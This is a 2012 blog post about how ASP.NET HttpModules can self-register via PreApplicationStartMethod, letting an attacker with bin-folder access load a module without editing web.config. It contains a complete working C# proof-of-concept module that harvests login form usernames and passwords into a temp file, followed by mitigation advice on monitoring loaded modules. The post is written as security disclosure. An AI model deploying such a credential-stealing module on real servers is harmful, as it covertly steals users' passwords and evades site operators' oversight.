---
title: "HttpModules. Now even easier to be misused."
date: 2012-02-22T11:34:00.003+01:00
tags: ["C#", "ASP.NET"]
author: "Bruno Garcia"
showToc: false
draft: false
cover:
    image: "ModulePoC.PNG"
    relative: true
    small: true
aliases:
  - /blogger/2012/httpmodules-now-even-easier-to-be/
description: "How ASP.NET HttpModules can be exploited by attackers to intercept requests, steal credentials, and compromise web applications."
---

Attacks like DDoS or simple web defaces are just vandalism and for sure quite annoying. However, what is considered to be a serious threat is when skilled attackers target one application (or one company), looking for specific information. They dig until they find a security hole, escalate privileges and once they have access to one server, they begin to obtain access to other computer systems within that network.

What does it have to do with HttpModules?

HttpModules gives you a complete control over the Request, Response, Session, Cache and other modules loaded within your web application. They are required and very useful when building ASP.NET applications.

This great control over the application can also be misused when malicious attackers break into the Web Application Server. All the applications hosted there are compromised. Access to its ConnectionStrings means database access, and in case authentication is based on forms, all password hashes are readable. Bruteforcing against a dictionary or even using a hash database, like [this one](https://web.archive.org/web/20250112235743/http://hash-database.net/) with over 10 million hashes, would break many of them. But with the control HttpModules gives to you is so big that you actually should not worry about hash cracking at all.

## HttpModule Overview

The classic way to build an HttpModule is to create a class within your Web Application project (or at least reference System.Web), implement `IHttpModule` interface, create an entry to the web.config, and it works. The registration of the HttpModule is the portion added to the web.config, like:

```xml
<httpModules>
    <add name="AuditModule" type="BrunoGarcia.AuditModule"/>
</httpModules>
```

HttpModules can easily be plugged in an application in production without rebuilding it or having any access to the source control what so ever. Simply adding the module dll under the bin folder or just putting HttpModule source file in `App_Code` folder which would trigger dynamic compilation and recycle the application. **But the web.config registration would have to be done either way.**

With the introduction of ASP.NET MVC 3, came along the `Microsoft.Web.Infrastructure` assembly. Microsoft has its description on [msdn](http://msdn.microsoft.com/en-us/library/microsoft.web.infrastructure(v=vs.99).aspx):

> The `Microsoft.Web.Infrastructure.DynamicModuleHelper` contains classes that assist in managing dynamic modules in ASP.NET web pages that use the Razor syntax.

One of the classes within that namespace is: [PreApplicationStartMethodAttribute](http://msdn.microsoft.com/en-us/library/system.web.preapplicationstartmethodattribute.aspx) that can be used to make the module registration programmatically. Note that even though it mentions "Razor syntax", what I describe here works with any type of ASP.NET application.

With this, it got even easier, considering the module will register itself. Just make sure the application server has the `Microsoft.Web.Infrastructure.dll` available either in the global assembly catalog (GAC) or at least under the application Bin folder and the application pool running on .Net 4.0. [Matt Wrock](http://www.mattwrock.com/) wrote [here](https://web.archive.org/web/20250821032403/https://code.msdn.microsoft.com/Installing-an-HttpModule-27d7c6e1), not long ago, about this new functionality and he ends the post with the section "Is this a good practice?" describing a few concerns about this technique. I'd like to quote this part:

> *"Well maybe I'm over thinking this but my first concern here is **discoverability**. In the case of this specific sample, the HttpModule is visibly changing the markup rendered to the browser. I envision a new developer or team inheriting this application and wonder just how long it will take for them to find where this "alteration" is coming from. ... Or perhaps a team member drops in such a module and forgets to tell the team she put it there. I'm thinking that at some point in this story some negative energy will be exerted. Perhaps even a tear shed?"*

Now an attacker with write permission to the application bin folder can inject a module without even changing the web.config, and therefore make it even more complicated to detect the system was compromised.

## PoC

To simulate the production system I've created a new project using ASP.NET Web Application template that creates a standard Web Forms Project, did no changes to the project, built it and hosted with IIS 7.5.
Created an entry to the loopback on `C:\Windows\System32\drivers\etc\hosts` called: httpmodulepoc.com

Note that IIS has default settings and the Application Pool is running under ApplicationPoolIdentity and as mentioned [here](http://support.microsoft.com/kb/2005172), is:

> *ApplicationPoolIdentity is a Managed Service Account, which is a new concept introduced in Windows Server 2008 R2 and Windows 7.*

For this PoC I thought of simply intercepting all requests, and in case of a POST on the login form, write the username and password to a file. Writing a file on disk with the permission set that Application Pool has by default doesn't give you many options. However the ACL on ASP.NET Temp folder allows write access.

Therefore I picked the path:

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files`

Then comes the module:

```csharp
using System;
using System.IO;
using System.Web;
using System.Web.Hosting;
using Microsoft.Web.Infrastructure.DynamicModuleHelper;

[assembly: PreApplicationStartMethod(typeof(RequestInterceptorModule), "Run")]
public class RequestInterceptorModule : IHttpModule
{
    public static void Run()
    {
        DynamicModuleUtility.RegisterModule(typeof(RequestInterceptorModule));
    }

    public void Dispose() { }

    const string myFile = @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\HttpModulePoC";
    static readonly object @lock = new object();

    public void Init(HttpApplication context)
    {
        context.BeginRequest += new EventHandler(context_BeginRequest);

        File.WriteAllText(myFile,
            string.Format("{0} Module initialized for application {1}\r\n",
            DateTime.Now,
            HostingEnvironment.ApplicationHost.GetSiteName()));
    }

    void context_BeginRequest(object sender, EventArgs e)
    {
        var app = sender as HttpApplication;
        if (app.Request.RequestType == "POST"
            && Path.GetFileName(app.Request.PhysicalPath) == "Login.aspx")
        {
            lock (@lock)
            {
                File.AppendAllText(myFile, string.Format("{0} - Login: {1} - Password: {2}\r\n",
                    DateTime.Now,
                    app.Request.Form["ctl00$MainContent$LoginUser$UserName"],
                    app.Request.Form["ctl00$MainContent$LoginUser$Password"]));
            }
        }
    }
}
```

I built this class in its own project. A dll file with 6KB was created and I just copied it to the hosted application HttpModulePoC bin folder.

Then I browse: httpmodulepoc.com

When I hit the server, the application pool process starts, the module loads itself, subscribes for BeginRequest event and writes to the file:

`21/02/2012 16:32:45 Module initialized for application HttpModulePoC`

Click on Login link, write username and password and click Log In:

![HttpModule PoC](ModulePoC.PNG)

In the file I see:

`21/02/2012 16:32:58 - Login: myUsername - Password: myPassword`

This is just an example of what could be done. Think of having complete access to Cache, User Session, Request, Response and more. So much can be done.

## Monitoring loaded modules

As I mentioned above, before the introduction of `Microsoft.Web.Infrastructure.DynamicModuleHelper.PreApplicationStartMethodAttribute`, creating custom modules required registration on web.config. Simple monitoring the configuration files was enough. But now a different approach has to be used.

Before injecting my module to the HttpModulePoC application, enumerating the loaded Modules with:

```csharp
HttpContext.Current.ApplicationInstance.Modules.AllKeys
```

I got the following 15 items:

OutputCache, Session, WindowsAuthentication, FormsAuthentication, PassportAuthentication, RoleManager, UrlAuthorization, FileAuthorization, AnonymousIdentification, Profile, ErrorHandlerModule, ServiceModel, UrlRoutingModule-4.0, ScriptModule-4.0, DefaultAuthentication

Mitigation could be done by writing a custom code to compare the allowed modules with the ones loaded. In case an unauthorized module is loaded, send an alert (or avoid completely the application from starting). Alerts could be simply written to event log or sent by e-mail.

Obviously, the most important is to train the development team to write secure code, make sure the system is up-to-date with security updates from the vendor of the operating system and applications installed. That will minimize the risk of attackers breaking into the application server.
